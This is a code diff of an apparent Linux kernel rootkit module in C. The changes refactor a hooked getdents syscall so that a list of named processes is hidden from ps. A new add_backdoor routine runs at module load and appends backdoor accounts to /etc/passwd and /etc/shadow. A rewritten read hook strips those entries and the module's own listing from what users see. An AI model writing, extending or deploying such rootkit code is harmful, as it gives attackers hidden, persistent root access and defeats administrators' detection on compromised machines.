@@ -164,98 +164,121 @@ error:
     goto cleanup;
 }
 
-asmlinkage long hacked_getdents(unsigned int fd,
-				struct linux_dirent *dirp,
-				unsigned int count)
+int is_command_ps(unsigned int fd)
 {
-    unsigned int dent_offset = 0;
-    long getdents_ret;
-    int error;
-    size_t dir_name_len;
-    struct linux_dirent *cur_dirent, *next_dirent;
     struct file *fd_file;
     struct inode *fd_inode;
-    struct pid *pid;
+
+    fd_file = fcheck(fd);
+    if (unlikely(!fd_file)) {
+        return 0;
+    }
+    fd_inode = file_inode(fd_file);
+    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
+        && iminor(fd_inode) == 0)
+    {
+        DEBUG("User typed command ps");
+        return 1;
+    }
+    return 0;
+}
+
+int is_hidden_process(char *proc_name)
+{
+    int i;
+    for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
+    {
+        // Hidden process is found
+        if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+long hide_processes(struct linux_dirent *dirp, long getdents_ret)
+{
+    unsigned int dent_offset;
+    struct linux_dirent *cur_dirent, *next_dirent;
+    char *proc_name, *dir_name;
+    char *dirent_ptr = (char *)dirp;
+    int error;
+    size_t dir_name_len;
+    pid_t pid_num;
     struct task_struct *proc_task;
-    char *proc_name, *dirent_ptr = (char *)dirp, *dir_name;
+    struct pid *pid;
+
+    // getdents_ret is number of bytes read
+    for (dent_offset = 0; dent_offset < getdents_ret;)
+    {
+        cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
+        dir_name = cur_dirent->d_name;
+        dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
+        error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
+        if (error < 0)
+        {
+            goto next_getdent;
+        }
+        pid = find_get_pid(pid_num);
+        if (!pid)
+        {
+            goto next_getdent;
+        }
+        proc_task = get_pid_task(pid, PIDTYPE_PID);
+        if (!proc_task)
+        {
+            goto next_getdent;
+        }
+        proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
+        if (!proc_name)
+        {
+            goto next_getdent;
+        }
+        proc_name = get_task_comm(proc_name, proc_task);
+        if (is_hidden_process(proc_name)) {
+            // Hide the process by deleting its dirent: shift all its right dirents to left.
+            printk("Hide process: %s\n", proc_task->comm);
+            next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
+            memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
+            getdents_ret -= cur_dirent->d_reclen;
+            // To cancel dent_offset += cur_dirent->d_reclen at the end of for loop.
+            dent_offset -= cur_dirent->d_reclen;
+        }
+        kfree(proc_name);
+    next_getdent:
+        dent_offset += cur_dirent->d_reclen;
+    }
+    return getdents_ret;
+}
+
+long handle_ps(unsigned int fd, struct linux_dirent *dirp, long getdents_ret)
+{
     struct files_struct *open_files = current->files;
     int is_ps = 0;
-    pid_t pid_num;
-    //DEBUG("Entering hacked getdents");
+    spin_lock(&open_files->file_lock);
+    is_ps = is_command_ps(fd);
+    if (is_ps != 0) {
+        getdents_ret = hide_processes(dirp, getdents_ret);
+    }
+    spin_unlock(&open_files->file_lock);
+    return getdents_ret;
+}
+
+asmlinkage long hacked_getdents(unsigned int fd,
+                struct linux_dirent *dirp,
+                unsigned int count)
+{
+    long getdents_ret;
     // Call original getdents system call.
     getdents_ret = (*orig_getdents)(fd, dirp, count);
 
     // Entry point into hiding files function
     getdents_ret = handle_ls(dirp, getdents_ret);
 
-    spin_lock(&open_files->file_lock);
-    fd_file = fcheck(fd);
-    if (unlikely(!fd_file)) {
-        goto exit_unlock;
-    }
-    fd_inode = file_inode(fd_file);
-    //printk("fd_inode->i_ino: %lu", fd_inode->i_ino);
-    //printk("MAJOR->MAJOR: %i", imajor(fd_inode));
-    //printk("MINOR->MINOR: %i", iminor(fd_inode));
-    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
-        && iminor(fd_inode) == 0)
-    {
-        DEBUG("User typed command ps");
-        is_ps = 1;
-    }
+    // Entry point into hiding processes function
+    getdents_ret = handle_ps(fd, dirp, getdents_ret);
 
-    if (is_ps != 0) {
-        // getdents_ret is number of bytes read
-        for (dent_offset = 0; dent_offset < getdents_ret;)
-        {
-            cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
-            dir_name = cur_dirent->d_name;
-            dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
-            error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
-            if (error < 0)
-            {
-                goto next_getdent;
-            }
-            pid = find_get_pid(pid_num);
-            if (!pid)
-            {
-                goto next_getdent;
-            }
-            printk("proc_task%p\n", pid);
-            proc_task = get_pid_task(pid, PIDTYPE_PID);
-            printk("proc_task%p\n", proc_task);
-            if (!proc_task)
-            {
-                goto next_getdent;
-            }
-            proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
-            if (!proc_name)
-            {
-                goto next_getdent;
-            }
-            proc_name = get_task_comm(proc_name, proc_task);
-            if (strncmp(proc_name, HIDDEN_PROCESS, strlen(HIDDEN_PROCESS)) == 0)
-            {
-                // Hide the process by deleting its dirent: shift all its right dirents to left.
-                printk("%s work needs to be done to hide", HIDDEN_PROCESS);
-                next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
-                memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
-                getdents_ret -= cur_dirent->d_reclen;
-                dent_offset -= cur_dirent->d_reclen;
-            }
-            // goto exit_unlock;
-            printk("dir_name:%s\n", dir_name);
-            printk("proc_name%s\n", proc_name);
-            printk("pid_num:%i\n", pid_num);
-            kfree(proc_name);
-        next_getdent:
-            dent_offset += cur_dirent->d_reclen;
-        }
-        DEBUG("Exiting ps filter");
-    }
-exit_unlock:
-    //DEBUG("Exiting hacked getdents");
-    spin_unlock(&open_files->file_lock);
     return getdents_ret;
 }
 
@@ -315,18 +338,20 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 	struct path *path;
 
 	char *tmp_buf;
+	char *BACKDOOR;
 
+    //call original read
 	ret = (*orig_read)(fd, buf, count);
 
 	if(ret <= 0){
-		return ret;
+		goto exit;
 	}
 
 	file = fget(fd);
 
 	if(!file){
-		DEBUG("file doesn't exist");
-		return ret;
+		//DEBUG("file doesn't exist");
+		goto exit;
 	}
 
 	path = &file->f_path;
@@ -336,88 +361,171 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 
 	if(!tmp){
 		path_put(path);
-		DEBUG("couldnt create tmp");
-		return ret;
+		//DEBUG("couldnt create tmp");
+		goto cleanup1;
 	}
 
 	pathname = d_path(path, tmp, PAGE_SIZE);
 	path_put(path);
 
 	if(IS_ERR(pathname)){
-		free_page((unsigned long)tmp);
-		DEBUG("pathname errors");
-		return ret;
+		//free_page((unsigned long)tmp);
+		//DEBUG("pathname errors");
+		goto cleanup1;
 	}
 
 	if(strcmp(pathname, MODULE_FILE)==0){
         ret = remove_rootkit(buf, ret);
     }
     
+    //check if it's the files we want
 	if(strcmp(pathname, PASSWD_FILE)==0){
+		BACKDOOR = BACKDOOR_PASSWD;
+	} else if(strcmp(pathname, SHADOW_FILE)==0){
+		BACKDOOR = BACKDOOR_SHADOW;		
+	} else {
+        goto cleanup1;
+    }
 
-		if(!(strstr(buf, BACKDOOR_PASSWD))){
-			return ret;
-		}
+	if(!(strstr(buf, BACKDOOR))){
+		goto cleanup1;
+	}
 
-		tmp_buf = kmalloc(ret, GFP_KERNEL);
-		if(!tmp_buf){
-			return ret;
-		}
+	tmp_buf = kmalloc(ret, GFP_KERNEL);
+	if(!tmp_buf){
+		goto cleanup1;
+	}
 
-		copy_from_user(tmp_buf, buf, ret);
+	copy_from_user(tmp_buf, buf, ret);
 
-		if(!tmp_buf){
-			kfree(tmp_buf);
-			return ret;
-		}
+	if(!tmp_buf){
+		goto cleanup2;
+	}
 
-		if((strstr(tmp_buf, BACKDOOR_PASSWD))){
-			char *strBegin  = tmp_buf;
-			char *substrBegin = strstr(strBegin, BACKDOOR_PASSWD);
-			char *substrEnd = substrBegin + strlen(BACKDOOR_PASSWD);
-			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
-			memmove(substrBegin, substrEnd, remaining_length);
-			ret = ret - strlen(BACKDOOR_PASSWD);
-		}
+    //remove backdoor in buf, change ret
+	while((strstr(tmp_buf, BACKDOOR))){
+		char *strBegin  = tmp_buf;
+		char *substrBegin = strstr(strBegin, BACKDOOR);
+		char *substrEnd = substrBegin + strlen(BACKDOOR);
+		int remaining_length = (int)(strlen(substrEnd)) + 1 ;
+		memmove(substrBegin, substrEnd, remaining_length);
+		ret = ret - strlen(BACKDOOR);
+	}
 
-		copy_to_user(buf, tmp_buf, ret);
+	copy_to_user(buf, tmp_buf, ret);
+	
+cleanup2:	
+	if(tmp_buf) 
 		kfree(tmp_buf);
-	}
+	
+cleanup1:
+	if(tmp) 
+		free_page((unsigned long)tmp);
 
-	if(strcmp(pathname, SHADOW_FILE)==0){
-
-		if(!(strstr(buf, BACKDOOR_SHADOW))){
-			return ret;
-		}
-		
-		tmp_buf = kmalloc(ret, GFP_KERNEL);
-		if(!tmp_buf){
-			return ret;
-		}
-
-		copy_from_user(tmp_buf, buf, ret);
-
-		if(!tmp_buf){
-			kfree(tmp_buf);
-			return ret;
-		}
-
-		if((strstr(tmp_buf, BACKDOOR_SHADOW))){
-			char *strBegin  = tmp_buf;
-			char *substrBegin = strstr(strBegin, BACKDOOR_SHADOW);
-			char *substrEnd = substrBegin + strlen(BACKDOOR_SHADOW);
-			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
-			memmove(substrBegin, substrEnd, remaining_length);
-			ret = ret - strlen(BACKDOOR_SHADOW);
-		}
-
-		copy_to_user(buf, tmp_buf, ret);
-		kfree(tmp_buf);		
-	}
-
-	free_page((unsigned long)tmp);
-
+exit:
 	return ret;	
+}
+
+void add_backdoor(char * pathname)
+{
+    struct file *file;
+    char * BACKDOOR;
+    mm_segment_t old_fs;
+
+    char *buf;
+    bool has_backdoor =false;
+    int page_count = 0;
+
+    loff_t offset;
+
+    unsigned long ret;
+
+    if(strcmp(pathname, PASSWD_FILE)==0)
+        BACKDOOR = BACKDOOR_PASSWD;
+    if(strcmp(pathname, SHADOW_FILE)==0)
+        BACKDOOR = BACKDOOR_SHADOW;
+
+    old_fs = get_fs();
+
+    set_fs(get_ds());
+    file = filp_open(pathname, O_RDWR, 0);
+    set_fs(old_fs);
+
+    if(IS_ERR(file)){
+        goto exit;
+    }
+
+    //check if backdoor is already inserted
+    buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+
+    if(!buf){
+        goto cleanup1;
+    }
+
+    has_backdoor = false;
+    ret = PAGE_SIZE;
+    offset = 0;
+    while(ret == PAGE_SIZE){
+        offset = page_count*PAGE_SIZE;
+
+        set_fs(get_ds());
+        ret = vfs_read(file, buf, PAGE_SIZE, &offset);
+        set_fs(old_fs);
+
+        if(ret < 0){
+            //DEBUG("read errors");
+            goto cleanup2;
+        }
+
+        page_count++;
+
+        if(strstr(buf, BACKDOOR)){
+            has_backdoor = true;
+            break;
+        }
+    }
+
+    if(has_backdoor){
+        //DEBUG(pathname);
+        //DEBUG("-----already has backdoor-------");
+        goto cleanup2;
+    }
+
+    //DEBUG(pathname);
+    //DEBUG("--- doesn't have backdoor. inserting---");
+
+    //seek offset to end of file
+    offset = 0;
+
+    set_fs(get_ds());
+    offset = vfs_llseek(file, offset, SEEK_END);
+    set_fs(old_fs);
+
+    if(offset < 0){
+        goto cleanup2;
+    }
+
+    //add backdoor to the end of file
+    ret = 0;
+
+    set_fs(get_ds());
+    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
+    set_fs(old_fs);
+
+    if(ret<0){
+        goto cleanup2;
+    }
+
+cleanup2:
+    if(buf)
+        kfree(buf);
+
+cleanup1:
+    if(file)
+        filp_close(file, NULL);
+
+exit:
+    return;
 }
 
 void set_addr_rw(unsigned long addr)
@@ -466,6 +574,9 @@ static int __init initModule(void)
     }
 
     set_addr_rw((unsigned long) sys_call_table);
+
+    add_backdoor(PASSWD_FILE);
+    add_backdoor(SHADOW_FILE);
 
     HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);
 
